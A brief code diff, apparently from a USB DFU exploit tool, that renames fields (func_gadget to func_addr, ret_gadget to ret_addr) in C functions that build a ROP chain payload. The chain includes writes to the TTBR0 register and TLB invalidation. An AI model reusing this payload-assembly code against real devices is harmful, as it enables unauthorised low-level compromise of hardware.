@@ -116,7 +116,7 @@ static size_t usb_rop_callbacks(uint8_t *buf,
                 addr += MAX_BLOCK_SZ;
 
             if (i + j < callback_cnt - 1) {
-                reg = chip->func_gadget;
+                reg = chip->func_addr;
                 memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
                 block_0_sz += sizeof(reg);
                 reg = addr;
@@ -129,7 +129,7 @@ static size_t usb_rop_callbacks(uint8_t *buf,
                 memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
                 block_1_sz += sizeof(reg);
             } else if (i + j == callback_cnt - 1) {
-                reg = chip->func_gadget;
+                reg = chip->func_addr;
                 memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
                 block_0_sz += sizeof(reg);
                 reg = 0;
@@ -231,7 +231,7 @@ int assemble_payload(dfu_ctx_t *ctx)
             },
             { chip->write_ttbr0, chip->ttbr0_addr },
             { chip->tlbi, 0 },
-            { chip->ret_gadget, 0 }
+            { chip->ret_addr, 0 }
         };
         uint64_t reg;
 
